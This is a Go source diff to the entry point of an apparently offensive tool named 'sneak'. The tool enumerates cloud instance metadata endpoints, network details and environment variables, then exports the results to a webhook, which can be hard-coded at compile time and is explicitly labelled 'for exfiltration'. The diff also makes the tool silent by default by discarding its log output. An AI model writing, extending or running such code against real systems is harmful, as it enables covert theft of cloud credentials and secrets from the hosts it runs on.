@@ -2,7 +2,8 @@ package main
 
 import (
 	"flag"
-	"fmt"
+	"io/ioutil"
+	"log"
 	"os"
 
 	"github.com/ex0dus-0x/sneak"
@@ -17,9 +18,9 @@ var (
 	cloudMeta = flag.String("cloud", "", "Sets a specific cloud provider to do SSRF checks for")
 	webhook   = flag.String("webhook", "", "Webhook endpoint to push recovered data to")
 	silent    = flag.Bool("silent", false, "Do not output results to stdout")
+	logging   = flag.Bool("logging", false, "Print debug logging messages")
 	help      = flag.Bool("help", false, "Display this help screen")
 )
-
 
 // We can also set this through the linker in the case we're in an environment
 // where passing in flags or envvars isn't possible
@@ -33,29 +34,33 @@ func main() {
 		os.Exit(0)
 	}
 
+	if !*logging {
+		log.SetOutput(ioutil.Discard)
+	}
+
 	enum := sneak.StartEnum()
 	if !*noCloud {
-		fmt.Println("Enumerating cloud")
+		log.Println("Enumerating instance metadata endpoints")
 		if err := enum.CheckCloud(cloudMeta); err != nil {
-			fmt.Println(err)
+			log.Fatal(err)
 		}
 	}
 	if !*noNet {
-		fmt.Println("Enumerating net")
+		log.Println("Enumerating net")
 		enum.CheckNet()
 	}
 	if !*noEnv {
-		fmt.Println("Enumerating envs")
+		log.Println("Dropping environment variables")
 		enum.CheckEnv()
 	}
 
-    // override's the flag if set
-    if CompileTimeWebhook != "" {
-        webhook = &CompileTimeWebhook
-        fmt.Printf("Using webhook %s\n", *webhook)
-    }
+	// override's the flag if set
+	if CompileTimeWebhook != "" {
+		webhook = &CompileTimeWebhook
+		log.Printf("Using webhook %s for exfiltration\n", *webhook)
+	}
 
 	if err := enum.Export(webhook, *silent); err != nil {
-		panic(err)
+		log.Fatal(err)
 	}
 }
